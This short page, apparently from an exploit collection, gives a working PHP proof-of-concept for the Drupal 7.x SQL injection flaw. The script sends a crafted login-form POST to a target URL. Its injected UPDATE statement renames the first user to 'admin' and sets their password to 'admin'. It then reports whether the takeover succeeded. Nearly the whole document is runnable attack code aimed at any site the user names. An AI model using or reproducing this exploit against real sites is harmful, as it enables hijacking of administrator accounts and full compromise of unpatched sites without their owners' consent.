# Drupal 7.X SQL Injection Vulnerability

Reference Link: https://gist.github.com/milankragujevic/61eb72df71b69df80e86

```
<?php
/********************************************************
 * Drupal 7 SQL Injection vulnerability demo
 * Created by Milan Kragujevic (of milankragujevic.com)
 * Read more at http://milankragujevic.com/post/66
 * This will change the first user's username to admin
 * and their password to admin
 * Change $url to the website URL
 ********************************************************/
$url = '[URL HERE]'; // URL of the website (http://domain.com/) 
$post_data = "name[0%20;update+users+set+name%3D'admin'+,+pass+%3d+'" . urlencode('$S$CTo9G7Lx2rJENglhirA8oi7v9LtLYWFrGm.F.0Jurx3aJAmSJ53g') . "'+where+uid+%3D+'1';;#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";
$params = array(
	'http' => array(
		'method' => 'POST',
		'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
		'content' => $post_data
	)
);
$ctx = stream_context_create($params);
$data = file_get_contents($url . '?q=node&destination=node', null, $ctx);
if(stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) {
	echo "Success! Log in with username \"admin\" and password \"admin\" at {$url}user/login";
} else {
	echo "Error! Either the website isn't vulnerable, or your Internet isn't working. ";
}
```
